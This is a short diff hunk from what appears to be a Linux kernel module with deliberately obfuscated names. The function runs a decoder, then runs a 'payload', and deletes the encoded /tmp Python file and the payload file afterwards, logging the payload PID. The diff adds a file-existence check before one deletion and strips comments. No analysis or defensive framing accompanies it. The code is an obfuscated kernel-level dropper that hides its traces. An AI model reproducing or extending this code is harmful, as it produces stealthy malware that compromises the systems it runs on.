@@ -218,12 +218,14 @@ void oehjdpajek(void){
     if (jdkelskjds(JSHDNEJSNA, shdjensjdm) >= 0) {           
         uehsjdnshd(); // execute decoder
         ssleep(7);
-        ahsgehdbsj("/tmp/dheysjdnsj.py"); // remove encoded file
+        if (ldksjeushd("/tmp/dheysjdnsj.py")){
+            ahsgehdbsj("/tmp/dheysjdnsj.py");
+        }
 
         if (ldksjeushd(HAJSNEJDNF)){
             jdkepflfks(); // execute payload
             ssleep(7);
-            ahsgehdbsj(HAJSNEJDNF); // remove payload file
+            ahsgehdbsj(HAJSNEJDNF);
             printk(KERN_INFO "mob: [INFO] 4 Payload PID: %d\n", shajshejxn);
         } else {
             printk(KERN_INFO "mob: [INFO] 5 Payload PID: %d\n", shajshejxn);
